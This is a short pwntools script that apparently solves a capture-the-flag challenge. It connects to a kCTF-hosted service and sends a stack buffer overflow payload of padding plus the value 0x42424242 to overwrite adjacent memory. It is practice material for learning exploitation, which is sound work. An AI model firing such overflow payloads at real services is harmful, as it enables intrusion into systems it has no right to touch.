from pwn import *

pr = remote('p0wn3d.kctf-453514-codelab.kctf.cloud', 1337)
#pr = process('./chal')

padding = 32

payload = flat(
    b'A' * padding,
    b'B' * 4,
    p64(0x42424242),
)
info(f"Payload: {payload}")
pr.recvuntil(b"words?\n")
pr.sendline(payload)

print(pr.recvall())

#print(pr.recv().decode())